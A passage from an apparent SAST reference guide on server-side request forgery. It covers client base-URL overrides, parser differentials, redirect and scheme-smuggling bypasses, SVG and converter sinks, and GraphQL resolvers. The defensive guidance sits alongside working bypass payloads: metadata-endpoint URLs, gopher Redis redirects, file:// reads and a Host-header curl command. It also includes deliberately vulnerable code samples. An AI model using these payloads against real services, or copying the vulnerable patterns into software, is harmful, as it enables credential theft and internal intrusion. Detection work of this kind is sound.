**Generic SAST signal (any row):** a client is instantiated with a hardcoded base URL/prefix, and a **later `.get/.post/.put/.delete/.request`/`@Url`/`uri()` call passes a non-literal (user-influenced) path/url** that is not first validated to be relative (no scheme, not `//`-leading, optionally no `\`) **and** whose resolved host/origin is not re-compared to the configured base before the request. Treat the `baseURL`-configured-but-absolute-arg-allowed shape as VULN by default — the configured base provides a false sense of safety and, like axios, often carries credentials that then leak to the attacker host.

### Declarative / SDK-style REST-client libraries (the `RESTDataSource` footgun in every language)

The same footgun appears one layer up, in **"API client" / "data source" / "integration SDK" abstractions** where you subclass or annotate a client with a configured base URL and call relative-path methods. These hide the sink behind a decorator/annotation/base-class method (not a visible `fetch(`), so grep-for-HTTP-client misses them — yet an **absolute / protocol-relative / base-overriding argument** still escapes the configured base (often forwarding the configured auth headers to the attacker host). Flag when the per-call path/url/`URI`/endpoint argument is user-influenced and not validated as relative + host-rechecked.

| Library (lang) | Base config | Per-request override sink to flag |
|---|---|---|
| **Apollo `RESTDataSource` / `@apollo/datasource-rest`** (JS/TS) | `this.baseURL` / `resolveURL()` | `this.get(path)` with absolute/`//` `path`, or an overridden `resolveURL` (see section below) |
| **OpenFeign / Spring Cloud OpenFeign** (Java) | `@FeignClient(url=…)` / `Feign.target(…)` | a **`java.net.URI` method parameter (any position) replaces the base URL** — documented "expected behavior," routinely flagged as SSRF |
| **Spring 6 HTTP Interface** (Java) | `@HttpExchange` + base `RestClient`/`WebClient` | a `URI` argument to the exchange method overrides the configured base |
| **MicroProfile Rest Client** (Java/Jakarta) | `@RegisterRestClient(baseUri=…)` | per-call `URI`/`@Path`-built absolute target overriding `baseUri` |
| **Refit** (.NET) | `RestService.For<T>(baseUrl)` | per-request **full URL** via `[Get("{url}")]` interpolation or an absolute `HttpRequestMessage.RequestUri` |
| **RestSharp** (.NET) | `new RestClient(baseUrl)` | docs: "when base URL is set you can use both relative **and absolute** path" → an absolute `RestRequest`/`GetJsonAsync("http://…")` resource overrides `BaseUrl` |
| **Flurl** (.NET) | `"base".AppendPathSegment(x)` | `x` absolute (or a user-built full URL) → request goes to attacker host |
| **Saloon** (PHP) | Connector `resolveBaseUrl()` + Request `resolveEndpoint()` | an absolute `resolveEndpoint()` value overrides the connector base |
| **Symfony HttpClient** (PHP) | `ScopingHttpClient` / `base_uri` option | absolute URL arg ignores the scoped `base_uri` |
| **Sling** (Go) | `sling.New().Base(base)` | `.Path(p)` uses `url.ResolveReference` → absolute/`//` `p` rebases to attacker host |
| **Her** (Ruby) | `Her::API.setup url:` (Faraday-backed) | full-path request methods — `Model.get/post/put("<path>")`, `get_collection`/`get_resource`, `request(_path: …)` — pass the path to Faraday, so an **absolute** path arg overrides the base (inherits the Faraday row above) |
| **OpenAPI-generated clients** (all langs) | config `BasePath`/`servers[]` / `Configuration.host` | operation methods that accept a server-override or full-URL param; a settable `servers`/`host` from user input |
| **Uplink / Slumber / Tapioca** (Python) | Retrofit-style `base_url` | a dynamic/`@get`-templated URL or `Url`-typed arg that carries an absolute value |

**Same SAFE rule for all:** never bind user input to the base-overriding argument (`URI` param, `@Url`, full-URL endpoint, absolute resource); keep the route a fixed relative template with encoded `@Path`/segment params; if a dynamic target is unavoidable, reject inputs that parse as absolute or start with `//`/`\` and re-compare the resolved host against an allowlist before the call; never forward configured credentials to a non-allowlisted host.

**Not this class — host-pinned clients (don't false-positive):** some "REST ORM" libraries pin the request to the configured base host, so a user-controlled **path/id** stays on that host and is *not* a base-override SSRF. **Rails `ActiveResource`** is the canonical example: its `Connection` opens `Net::HTTP` to `self.site`'s host and sends the (escaped) `id`/path/`:from` as the request-target **to that pinned host** — `Model.find(id)` / `find(:all, from: "/path")` do not cross origins. For `ActiveResource`, SSRF only arises when **`self.site`/`self.prefix` is itself built from user input** (configurable/multi-tenant endpoint) — judge that under the generic *configured base set from user input* rule, not the absolute-arg-override shape above.

## SSRF via URL Parser Differentials

```java
// VULNERABLE: validation checks parsed URL but request uses raw input
// Parser differential: java.net.URL vs Apache HttpClient may parse differently
String url = request.getParameter("url");
URL parsed = new URL(url);
// Allowlist check on parsed.getHost() — but HTTP client may follow redirect
// to internal target after passing host check

// VULNERABLE: URL with credentials bypasses host-based allowlist
// http://allowed.com@169.254.169.254/ — some parsers use the part after @ as host
// http://169.254.169.254#allowed.com — fragment ignored by some validators
```

### WHATWG vs RFC3986 — Backslash and Userinfo Split

Some HTTP clients (WHATWG URL algorithm) treat `\` as `/` and normalize `http://allowed\@attacker/` differently from RFC3986 parsers used in validators:

```text
http://allowed.com\@169.254.169.254/latest/meta-data/
http://allowed.com\169.254.169.254/
```

**VULN condition**: allowlist/blocklist runs on `java.net.URL`, `urlparse`, or regex over raw string; outbound `fetch`/`HttpClient`/`requests` uses a different parser — host seen by validator ≠ host connected.

**Grep seeds**: dual parse paths (`new URL` + `HttpClient`), `normalize.*url` after allowlist check, `allowedHosts.includes(host)` on pre-decode string.

**SAFE**: single canonical parser library for validate and fetch; compare normalized punycode host; connect to pinned resolved IP; reject URLs containing `\`, unescaped `@` in authority, or userinfo components unless explicitly required.

### Normalize-Before-Allowlist (Recollapse)

**VULN condition**: security check on raw or once-decoded input; HTTP client applies additional decoding, Unicode normalization, or scheme-default port folding before connect:

```python
# VULN: check raw, fetch after client normalizes
if '169.254.' not in user_url:  # bypass via percent-encoding, IDNA, fullwidth chars
    requests.get(user_url)
```

**SAFE**: `urllib.parse` / WHATWG parse → IDNA encode hostname → resolve → IP range check → pin IP → fetch with redirect re-validation at each hop.

### Metadata Path / Fragment Tricks

```text
http://169.254.169.254/latest/meta-data/#@allowed.com
http://metadata.google.internal/#@cdn.example.com
```

Validators that strip fragments or compare only the pre-`#` portion may approve a metadata URL while error messages/logging show the allowlisted fragment host. Fetch clients ignore fragment for HTTP — full request hits metadata.

**SAFE**: parse with one library; validate `hostname` from authority only (never fragment); block link-local/metadata IPs after DNS resolution regardless of fragment/userinfo.

## SSRF via Redirect Chain (30x Bypass)

The single most common way to defeat an SSRF allowlist: the attacker controls (or owns) an **allowlisted** host that answers with a redirect (`Location:`) to an internal target. The validator approves the *initial* URL; the HTTP client then **auto-follows** the redirect and connects to the host the validator never saw. Treat any user-controlled fetch that follows redirects without **re-validating every hop** as Likely Vulnerable.

**Status-code breadth** — do not reason about `301`/`302` only. Common clients follow the whole 3xx family — `300, 301, 302, 303, 305, 307, 308` — and permissive clients/`libcurl` follow **non-standard 3xx codes** (e.g. `332`, any `3xx` with a `Location`). A filter or mock that special-cases 301/302 misses the rest.

**307 / 308 preserve method and body** — unlike 301/302/303 (which may downgrade to GET), `307`/`308` replay the **original verb and body** to the redirect target — needed to reach verb-sensitive internal services (POST-only RPC, IMDSv2 `PUT`, Redis/`gopher` payloads carried in a POST body).

**Scheme switch on redirect (high value)** — scheme allowlists enforced only on the *initial* URL are bypassed when `Location:` switches scheme:
```text
GET https://allowed.com/avatar.jpg   ->   302 Location: gopher://127.0.0.1:6379/_<redis-payload>
                                            (or file:///etc/passwd, dict://127.0.0.1:6379/INFO)
```
If the client follows cross-scheme redirects, a read-only HTTP fetcher becomes a `gopher`/`file`/`dict` primitive. Cross-ref "Scheme Allowlist / Protocol Smuggling" and `rce.md`.

**Redirect to internal / alternate-encoded host** — `Location:` to `169.254.169.254`, any alternate IP encoding, `instance-data`, `metadata.google.internal`, or a rebinding host. The first-hop allowlist/IP check never runs on the redirect target. Cross-ref the IP-encoding canonicalization matrix.

**Fake-extension / content-type / response-shape bypass** — "image/JSON/CSV/XML/PDF only" proxies that validate the **request URL extension** or the **first response's `Content-Type`** are bypassed because the allowlisted `…/thumb.jpg` (right extension) responds `30x` to metadata. The redirect response can also carry a **spoofed `Content-Type`** and a valid-looking **body** (or no body), defeating checks that "the response looks like a real JPEG/JSON". The extension/content-type proves nothing about the *final* host.

**`Location` honored on non-3xx** — some clients follow `Location` on `201 Created` and `Content-Location` on `200 OK`. A validator that only inspects 3xx responses misses these.

**Non-HTTP protocol redirects** — redirect-following is not HTTP-only: an `RTSP 301`/`Location` (and other line-oriented protocols) likewise sends the client to an internal target. Flag redirect-follow on any protocol client whose target derives from user input.

### Redirect status / response-shape bypass matrix

| Trick | Example (initial → redirect) | Why the filter misses it |
|-------|------------------------------|--------------------------|
| Full 3xx family | `200`-only/301-302-only mock vs `303`/`305`/`307`/`308` Location | Validator/test reasons about 301/302 only |
| Non-standard 3xx | `HTTP/1.1 332` + `Location: http://169.254.169.254/` | libcurl/permissive clients still follow |
| Method/body preserving | `308 Location: http://169.254.169.254/...` on a POST | 307/308 replay verb+body to internal target |
| Scheme switch | `302 Location: gopher://127.0.0.1:6379/_…` | Scheme allowlist checked on first URL only |
| Internal/alt-encoded host | `302 Location: http://0xa9fea9fe/` | Host/IP check never re-runs on `Location` |
| Fake extension | `GET /thumb.jpg` → `301` → metadata | URL-extension allowlist passes on first hop |
| Content-type/body spoof | `301` carrying `Content-Type: image/jpeg` + fake body → metadata | Response-shape check trusts the redirect, not final host |
| `Location` on 201/200 | `201`/`200` + `Location`/`Content-Location` | Validator only inspects 3xx |
| Non-HTTP redirect | `RTSP/1.0 301 Location: http://169.254.169.254/` | Redirect-follow not limited to HTTP |

### SAST signal and safe pattern

**VULN condition**: a user-controlled outbound fetch where the client **auto-follows redirects** and the destination is validated **only before the first request** (no per-hop re-check). Default-follow clients are the norm — flag them explicitly.

**SAFE**: either disable auto-follow and handle redirects manually, **or** re-validate **every hop** — re-parse `Location` → IDNA/normalize host → re-resolve DNS → block private/link-local/metadata ranges → **re-check the scheme allowlist** → pin the resolved IP for the connect — and cap with a small **max-redirect** limit.

```java
// VULNERABLE: defaults follow redirects to internal targets
URL url = new URL(userInput);
HttpURLConnection conn = (HttpURLConnection) url.openConnection();
conn.setFollowRedirects(true);          // default — follows 3xx (incl. 307/308) to internal
restTemplate.getForObject(userInput, String.class);   // RestTemplate follows by default

// SAFE: disable auto-follow; validate each hop manually before reconnecting
conn.setInstanceFollowRedirects(false);
```

```python
# VULN: requests follows redirects by default; only the first URL was checked
requests.get(user_url)                              # allow_redirects=True by default

# SAFE: no auto-follow; re-validate Location host+scheme+resolved-IP each hop, cap hops
resp = requests.get(user_url, allow_redirects=False)
# loop: parse resp.headers["Location"] -> allowlist host -> scheme in {http,https}
#       -> resolve -> reject private/metadata -> pin IP -> refetch (max N hops)
```

```javascript
// VULN: axios/fetch follow redirects by default
await axios.get(userUrl);
await fetch(userUrl);                               // redirect: 'follow' (default)

// SAFE: take manual control and re-validate each Location
await axios.get(userUrl, { maxRedirects: 0 });
await fetch(userUrl, { redirect: 'manual' });
```

```go
// SAFE: reject/re-validate redirects via CheckRedirect (default follows up to 10)
client := &http.Client{CheckRedirect: func(req *http.Request, via []*http.Request) error {
    return http.ErrUseLastResponse // or validate req.URL host/scheme/resolved-IP, cap len(via)
}}
```

```php
// VULN: libcurl follows Location and (if enabled) cross-scheme redirects
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

// SAFE: don't auto-follow; if you must, constrain protocols on BOTH initial and redirect
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_PROTOCOLS,       CURLPROTO_HTTP | CURLPROTO_HTTPS);
curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); // blocks redirect->file/gopher
curl_setopt($ch, CURLOPT_MAXREDIRS,       3);
```

**Grep seeds** — redirect-following clients on a user-controlled fetch, and validators that check before the fetch but never re-check `Location`:
```bash
# default-follow or explicit-follow on outbound clients
rg -n "allow_redirects\s*=\s*True|setFollowRedirects\(true\)|setInstanceFollowRedirects\(true\)|CURLOPT_FOLLOWLOCATION|maxRedirects|redirect:\s*'follow'|FollowRedirects" --glob '*.{py,js,ts,java,go,php,rb,cs}'
# follow enabled WITHOUT a redirect-protocol restriction (cross-scheme redirect risk)
rg -n "CURLOPT_FOLLOWLOCATION" --glob '*.php' | rg -v "CURLOPT_REDIR_PROTOCOLS"
# host/allowlist validated once, then a separate fetch (no per-hop re-validation)
rg -n "allowlist|allowed.?hosts|urlparse|new URL\(|url\.Parse" -A6 --glob '*.{py,js,ts,java,go}' | rg -n "requests\.|fetch\(|axios|http\.Get|HttpClient|openConnection"
```
**SAFE**: `allow_redirects=False` / `redirect:'manual'` / `maxRedirects:0` / `CheckRedirect`, or re-run the full host+scheme+resolved-IP allowlist on each `Location` with a max-hop cap.

## Scheme Allowlist / Protocol Smuggling

When the client is **not** restricted to `{http, https}`, an attacker swaps the scheme to reach non-HTTP services and escalate beyond a read-only fetch. `java.net.URL.openConnection()` handles `file`, `jar`, `ftp`, `netdoc`; `libcurl` (PHP `curl`, shell-outs) additionally handles `gopher`, `dict`, `ldap`, `tftp`, `smtp`, `imap`, `telnet`; PHP stream wrappers add `php://`, `data://`, `expect://`.

```java
// VULNERABLE: URL client that supports non-HTTP schemes
// Java URL.openConnection() supports: file://, jar://, ftp://, netdoc://
// If curl is used server-side (via exec), gopher://, dict://, ldap:// may be available
URL url = new URL(userInput);
InputStream is = url.openStream();  // file:// reads local files — also SSRF→LFI
```

**Escalation map (why scheme restriction matters):**

| Scheme | Reachable service | Impact |
|--------|-------------------|--------|
| `gopher://` | Redis, Memcached, FastCGI/PHP-FPM, MySQL, PostgreSQL, SMTP | Arbitrary multiline protocol writes → **RCE** (cron/authorized_keys/webshell, FastCGI `PHP_VALUE`), cache poisoning, mail relay |
| `dict://` | Redis, Memcached, FTP, any line-oriented service | Single-command probe/write, service fingerprint |
| `file://` / `netdoc://` | Local filesystem | Local file disclosure (SSRF→LFI) |
| `ftp://` | FTP + (Java/Python FTP injection) | Firewall pinhole / outbound connection smuggling |
| `php://`, `data://`, `expect://` | PHP wrapper engine | LFI/RCE when `file_get_contents`/`fopen` take the URL |

`gopher://` is the highest-value escalation because it lets the attacker write **arbitrary bytes with CRLF** to a backend TCP port — Redis `CONFIG SET dir`/`save`, Memcached `set`, and FastCGI records all become RCE primitives. Cross-ref `rce.md`, `path_traversal_lfi_rfi.md`, `php_security.md`.

**SAST takeaway**: require an explicit scheme allowlist (`scheme in {"http","https"}`) **before** the outbound call; flag any client where the scheme is derived from user input or defaulted by the URL parser. Restricting scheme alone is not a full SSRF fix (host still needs allowlisting) but its absence turns SSRF into RCE.

## CRLF / Request Splitting in Outbound URL

A newline (`\r\n`, `%0d%0a`, or raw `\n`) in a user-controlled URL component (host, port, path, or a header value built from the URL) lets the attacker inject additional request headers or smuggle a **second** request to the backend. This is the mechanism behind `gopher://` payloads and also bites plain HTTP clients that do not reject control characters in the URL.

```python
# VULN: user value with CRLF reaches the request line / headers
host = request.args["host"]            # "169.254.169.254:80/%0d%0aX-Injected: 1"
requests.get(f"http://{host}/api")     # splits into attacker-controlled headers

# VULN: port/path concatenation enables protocol injection via gopher/redis
url = f"gopher://127.0.0.1:6379/_{payload}"  # payload contains %0d%0a Redis commands
```

**VULN condition**: user input flows into a URL/host/port/path that is passed to an outbound client without rejecting/encoding `\r`, `\n`, `%0d`, `%0a`, `%0d%0a` (and double-encoded `%250d%250a`). Also flag header values built from user-controlled URL parts.

**Unicode-to-latin1 truncation (Node.js <= 8)**: a control-character filter that only rejects literal `\r`/`\n` is bypassable when high-codepoint Unicode characters in the request path truncate to CR/LF bytes as the client serializes the request to the wire (latin1). E.g. `U+010D`/`U+010A` (`č`/`Ċ`) collapse to `0x0D`/`0x0A`, smuggling CRLF and splitting the outbound request. Flag user-controlled Unicode reaching the path of a zero-length-body request (GET/DELETE) on legacy Node; SAFE = build the URL from properly-encoded components and reject non-ASCII in the request target.

**Grep seeds**: `\\r|\\n|%0d|%0a|%0D%0A` adjacent to `requests\.|http\.|fetch\(|curl|urlopen|HttpClient`; f-strings/concatenation building `host:port` or header values from request input.

**SAFE**: reject any URL containing control characters before the request; build outbound requests with a single URL object (never string-concatenate authority); use clients that refuse CR/LF in the request target. Cross-ref `http_response_splitting.md`, `smuggling_desync.md`, `crlf` handling in `correlation_header_injection.md`.

## SVG Rasterization as SSRF Sink

When the server **processes** a user-supplied SVG (thumbnail, preview, PDF export, format conversion via `librsvg`/ImageMagick/Inkscape/headless browser/`resvg`), external references inside the SVG fire as **server-side** outbound requests (and local file reads). The upload looks like an image; the rasterizer is the SSRF sink.

```xml
<!-- VULN: each of these fetches server-side when the SVG is rendered -->
<image xlink:href="http://169.254.169.254/latest/meta-data/" .../>      <!-- raster image ref -->
<?xml-stylesheet type="text/css" href="http://169.254.169.254/"?>       <!-- stylesheet ref -->
<pattern><image xlink:href="http://127.0.0.1:6379/"/></pattern>        <!-- pattern fill ref -->
<style>@font-face{font-family:x;src:url('http://169.254.169.254/')}</style>  <!-- font ref -->
```

**VULN condition**: user-uploaded/POSTed SVG (or any XML the renderer treats as SVG) is rendered server-side without disabling external resource loading. SVG is also XML — the same input can carry XXE (cross-ref `xxe.md`) and, if served inline to a browser, stored XSS (cross-ref `xss.md`).

**Grep seeds**: `rsvg|imagemagick|convert .*\.svg|inkscape|resvg|puppeteer|playwright|wkhtmlto|cairosvg|svg2(png|pdf)`; upload handlers accepting `image/svg+xml`.

**SAFE**: disable external entity/resource loading in the renderer (e.g. ImageMagick policy.xml denying `URL`/`HTTPS`/`MSL`/`text`; `cairosvg`/`resvg` with remote fetch off); sanitize SVG (strip `href`/`xlink:href`/`xml-stylesheet`/`@font-face`/external `url()`); rasterize in a network-isolated sandbox. Cross-ref `arbitrary_file_upload.md`.

## Media / Document Converter SSRF

Converters that parse a user-supplied media or document file follow embedded URLs/playlists/segment lists server-side — SSRF plus local file disclosure, no URL parameter required.

- **ffmpeg / video converters**: HLS `.m3u8` playlists and crafted `.avi`/container files reference external or `file:`/`concat:`/`http:` segments — ffmpeg fetches them and can splice local files into the output (`file_reading` AVI trick).
- **ImageMagick**: MVG/MSL and SVG delegates with `url(...)`, `image:`/`https:` directives reach remote and local resources (cross-ref `rce.md` for delegate command injection).
- **PDF / office / HTML-to-X renderers**: remote images, stylesheets, XInclude, or `<iframe>`/`<img>` in the source document are fetched during conversion.

**VULN condition**: user controls the file (or a URL inside it) handed to a converter that resolves embedded references, with no scheme/host restriction on those references.

**Grep seeds**: `ffmpeg|m3u8|concat:|libavformat`; `convert |mogrify|MagickWand|Image::Magick`; `wkhtmltopdf|weasyprint|libreoffice|unoconv|gotenberg|prince`.

**SAFE**: convert with remote/non-essential protocols disabled (ffmpeg `-protocol_whitelist file,crypto` scoped tightly; ImageMagick policy.xml; PDF renderer with remote fetch disabled); run converters in a sandbox with no egress and no sensitive filesystem access.

## Java Additional SSRF Sinks

```java
// VULNERABLE: XML parser as SSRF vector
DocumentBuilder db = DocumentBuilderFactory.newInstance().newDocumentBuilder();
db.parse(new InputSource(userInput));   // userInput = "http://169.254.169.254/"

// VULNERABLE: ImageIO fetching remote URL
BufferedImage img = ImageIO.read(new URL(userInput));

// VULNERABLE: URL class loader loading from user URL
URLClassLoader loader = new URLClassLoader(new URL[]{new URL(userInput)});

// VULNERABLE: Jsoup connecting to user URL
Document doc = Jsoup.connect(userInput).get();

// VULNERABLE: Apache HttpComponents
CloseableHttpClient client = HttpClients.createDefault();
HttpGet get = new HttpGet(userInput);
client.execute(get);
```

## SSRF in Cloud/Kubernetes Environments — Additional Targets

When running on cloud/k8s, these internal URLs are high-value SSRF targets:
- `http://169.254.169.254/` — AWS/Azure/GCP instance metadata (the shared link-local IP)
- `http://instance-data/latest/meta-data/` — AWS hostname alias for the metadata IP (bypasses IP-string blocklists)
- `http://169.254.170.2/v2/credentials/` — AWS ECS/Fargate task-role credentials endpoint
- `http://metadata.google.internal/computeMetadata/v1/...?recursive=true` — GCP (header `Metadata-Flavor: Google`; recursive pulls whole subtrees)
- `http://100.100.100.200/latest/meta-data/` — Alibaba Cloud metadata
- `http://169.254.169.254/metadata/v1.json` — DigitalOcean (no header)
- `http://169.254.169.254/opc/v1/instance/` and `http://192.0.0.192/latest/meta-data/` — Oracle Cloud (two distinct endpoints/IPs)
- `http://metadata.tencentyun.com/latest/meta-data/` — Tencent Cloud
- `http://169.254.169.254/openstack/latest/meta_data.json` — OpenStack / Huawei Cloud
- `https://metadata.packet.net/userdata` — Equinix Metal / Packet
- `http://kubernetes.default.svc/` — K8s API server (internal)
- `http://10.0.0.1/` — typical internal gateway
- Redis on `redis://localhost:6379` — via gopher:// if supported

Flag any user-controlled URL fetch where these are not explicitly blocked. Note that hostname aliases (`instance-data`, `metadata.google.internal`, `metadata.tencentyun.com`) and the alternate IPs (`169.254.170.2`, `100.100.100.200`, `192.0.0.192`) defeat blocklists that only string-match `169.254.169.254`. Cross-ref `kubernetes_cloud_security.md`.

## URL-Fetch / Media-Proxy SSRF (`url=` parameter pattern)

A very common SSRF shape is an endpoint that accepts a full URL (or host) in a request parameter and fetches it server-side as a "convenience" feature. This is a **class**, not a single product — detect it by the *fetch-by-user-URL* shape regardless of framework or language.

**Source parameter names to flag** (when the value is, or becomes, an absolute URL/host passed to an outbound client): `url`, `src`, `source`, `image`, `imageUrl`, `img`, `target`, `dest`, `uri`, `link`, `feed`, `callback`, `webhook`, `to`, `proxy`, `fetch`, `load`, `remote`.

**Feature archetypes — all the same class:**
- Image optimizers / resizers / thumbnailers (`/image?url=`, `/cdn-cgi/image/`, imgproxy, thumbor, Cloudinary `fetch`)
- Link preview / URL unfurling / oEmbed / favicon fetchers
- PDF / screenshot / HTML-to-image renderers (a headless browser fetches the URL)
- "Import from URL" / avatar-from-URL / remote file import
- Outbound webhooks / health-check pingers where the caller sets the URL

**Concrete instance — Next.js Image Optimization (`/_next/image?url=...`)**: the optimizer fetches `url` server-side; the host allowlist lives in `next.config.js`.
```js
// VULN — wildcard host allowlist lets the optimizer fetch ANY host (SSRF)
images: { remotePatterns: [{ protocol: 'https', hostname: '**' }] }   // or hostname: '*'
images: { domains: ['*'] }                                            // legacy field, same problem
// VULN — broad subdomain wildcard: pivot to internal via an open redirect on ANY matching subdomain
images: { remotePatterns: [{ hostname: '*.example.com' }] }
// SAFE — explicit, non-wildcard hosts only
images: { remotePatterns: [{ protocol: 'https', hostname: 'cdn.example.com' }] }
```
- **VULN**: `dangerouslyAllowSVG: true` (or any image proxy that serves the fetched SVG inline) — attacker points `url=` at a malicious SVG and gets stored/reflected XSS in the app origin. SVG is active content; see `xss.md`.

**What to flag**: any archetype above where the destination host is user-controlled and there is NO explicit non-wildcard host allowlist, NO scheme restriction to `http(s)`, and NO block of internal ranges / metadata IPs. The "resize / preview / import" feature is not a mitigation — it **is** the sink.

**FALSE POSITIVE**: destination restricted to an explicit non-wildcard host allowlist; user value confined to a path segment under a hardcoded base; `url=` only ever resolves to a fixed first-party asset host with validation.

### Webhook Test / Verify URL Features

Integration UIs often expose **test**, **ping**, **verify**, or **validate** actions that POST/GET a user-supplied callback URL server-side — same SSRF class as `url=` proxies with higher trust (may run from job workers with cloud credentials). See `webhook_integration_security.md` for CRUD IDOR, inbound signature gaps, and naming patterns (`testWebhook`, `pingWebhook`, `verifyUrl`, `sendTest`, `validateWebhook`).

**Grep seeds**: `testWebhook`, `pingWebhook`, `verifyUrl`, `sendTest`, `validateWebhook`, `checkEndpoint`, `webhook.*test`, `callback.*verify`.

## SSRF via Host / Forwarded Headers (request-context-derived URLs)

Servers sometimes build an *internal* request URL from request-context headers the client controls — `Host`, `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Forwarded-Server`, `Referer`, `Origin`. Because these are attacker-controllable, the "internal" fetch (or generated absolute link/callback) can be redirected to an arbitrary host. Framework-agnostic class; also drives password-reset link poisoning and cache poisoning.

**VULN shape**: `fetch(`${req.headers['x-forwarded-host']}/internal/path`)`; `new URL(path, `https://${req.headers.host}`)` then fetched; building absolute callback/reset URLs from `Host`.

### Referer (and Other Headers) as Outbound Fetch Source

**VULN condition**: background jobs, analytics, link preview, or "fetch URL from header" helpers pass `Referer`, `Origin`, `X-Forwarded-For`-derived URLs, or stored header values directly to outbound HTTP clients — not just Host-derived absolute URL construction.

```javascript
// VULN: Referer header becomes SSRF sink
const ref = req.headers.referer || req.headers.referrer;
await axios.get(ref);  // attacker sets Referer: http://169.254.169.254/
```

```python
# VULN: webhook/ping uses Referer or callback header without allowlist
requests.get(request.headers.get('Referer'))
```

**Grep seeds**: `referer`, `referrer`, `headers\[.Referer`, `getHeader\(.Referer`, `req\.headers\.referer` adjacent to `fetch|requests\.|HttpClient|axios|curl`.

**SAFE**: never fetch raw header URLs; if required, parse and allowlist hostname same as explicit `url=` parameters.

**Concrete instance — Next.js Server Actions** (`"use server"` functions dispatched via the `Next-Action` header): older versions built the internal subrequest URL from the request `Host` header, so a spoofed `Host` turned action dispatch into blind→full-read SSRF (the `Next-Action` token selects the function; the request path is ignored). Generic lesson: any server-side request whose **authority** is derived from a request header is SSRF unless the host is validated against an allowlist.

**SAFE**: derive the base URL from server config/environment (e.g. `process.env.PUBLIC_URL`), not from request headers; validate `Host`/`X-Forwarded-Host` against an allowlist before use.

### Overly-permissive reverse proxy (Host-routed upstream)

A reverse proxy whose **upstream is derived from the request** turns the proxy itself into an SSRF primitive — the attacker sets the `Host` header (or a path/variable the proxy interpolates) and the proxy forwards to an internal target.

```nginx
# VULN: upstream built from the client-controlled Host header
location / {
    proxy_pass http://$http_host;          # attacker: Host: 169.254.169.254
}
# VULN: upstream taken from a request variable / path segment
location /proxy/ {
    proxy_pass http://$arg_target;          # ?target=169.254.169.254
}
```

```bash
# Equivalent at the wire level: open proxy routes by Host header
curl http://target/latest/meta-data/ -H "Host: 169.254.169.254"
```

**VULN condition**: `proxy_pass`/`ProxyPass`/upstream address contains a variable fed by `$http_host`, `$host`, `$arg_*`, `$request_uri`, or a user path segment with no allowlist. **SAFE**: hardcode upstreams (or map through a fixed allowlist), and set the upstream `Host` from config, not the inbound header. Cross-ref `nginx_security.md`, `reverse_proxy_access_bypass.md`, `host_header_poisoning.md`.

**Recognized sanitizers summary**: hostname-sanitizing prefixes, allowlist/`contains` guards, host equality checks, regexp barriers, fixed-prefix string construction (Python partial), `encodeURIComponent` (JS), redirect-check helpers (Go), `AntiSSRF` validators (Python), models-as-data `request-forgery` barriers.

## GraphQL Resolver SSRF

GraphQL **resolver arguments** are remote user input. Resolvers that fetch remote resources — webhooks, import-from-URL, avatar/image proxy, link preview — pass `args` fields directly into outbound HTTP clients. The same SSRF class applies when the destination is a **single URL string** or **decomposed components** (`scheme`, `host`, `port`, `path` / `baseUrl` + `path`) assembled server-side.

**Field/arg name heuristics** (when value reaches a fetch sink): `url`, `importUrl`, `fetchUrl`, `download`, `remote_url`, `target_url`, `webhook`, `callback`, `imageUrl`, `source`, `link`, `endpoint`.

**Vulnerable conditions**:
- Resolver builds `fetch(args.url)` / `requests.get(args.importUrl)` with no host allowlist
- Decomposed args: `f"{args.scheme}://{args.host}:{args.port}{args.path}"` then `axios.get(...)` — attacker sets `host` to `169.254.169.254` or `metadata.google.internal`
- Stored URL on a GraphQL type resolved later without write-time or read-time allowlist validation

**Grep seeds** — resolver signature → outbound client:
```bash
rg -n "async\s+\w+\(|def\s+\w+\(|func\s+\(.*\)\s*\(|resolve\s*\(" --glob '*.{js,ts,py,go,java,rb,cs}' -A12 | rg -n "importUrl|fetchUrl|remote_url|target_url|download|webhook|callback|imageUrl"
rg -n "(importUrl|fetchUrl|remote_url|target_url|args\.(url|host|scheme|port|path))" --glob '*.{js,ts,py,go,java}' -A3 | rg -n "fetch\(|requests\.(get|post)|axios\.|http\.Get|HttpClient|urllib|httpx|aiohttp"
rg -n "scheme.*host|host.*port.*path|baseUrl.*path" --glob '*.{js,ts,py,go}' -B2 -A4 | rg -n "fetch|requests|axios|http\.Get"
```

**VULN**:
```python
def resolve_import_url(parent, info, url):
    return requests.get(url).text  # args.url fully attacker-controlled

def resolve_fetch(parent, info, scheme, host, port, path):
    return httpx.get(f"{scheme}://{host}:{port}{path}").json()  # decomposed SSRF
```

**SAFE**: same as general SSRF — strict hostname allowlist, resolve-then-validate IP with pinning, scheme restricted to `https`, user input never as authority; apply at resolver boundary before any outbound call. Cross-ref `graphql_injection.md` (resolver-layer injection vs document injection).

### GraphQL gateway / data-source frameworks (declarative upstream URL construction)

Beyond hand-written resolvers and code-level clients (Apollo `RESTDataSource` etc., above), **GraphQL gateways / BFFs / "virtual graph" frameworks build the upstream URL declaratively** — from config, a directive, or a URL template — and then fetch it for you. The same base-rebasing / authority-injection SSRF applies, but the sink is a config string or template rather than a `fetch(` call, so a resolver-only or grep-for-`fetch` scan misses it. Three shapes to flag:

1. **Admin/metadata-settable upstream URL reachable via a privileged op.** Frameworks that register upstreams at runtime (remote schemas, action handlers, data sources) take a full URL from a metadata/admin API. If that API is reachable (exposed metadata endpoint, weak/forwarded admin role, a `create_*`/`add_*` permission granted too broadly), an attacker points the upstream at `http://169.254.169.254/…` or an internal service → SSRF. Real example: **Hasura `add_remote_schema` remote-schema URL injection, CVE-2021-47715 (CWE-918)**; equivalently a Hasura **action handler** set to an IMDS URL, or a WunderGraph/Mesh data-source `url` taken from a settable source.
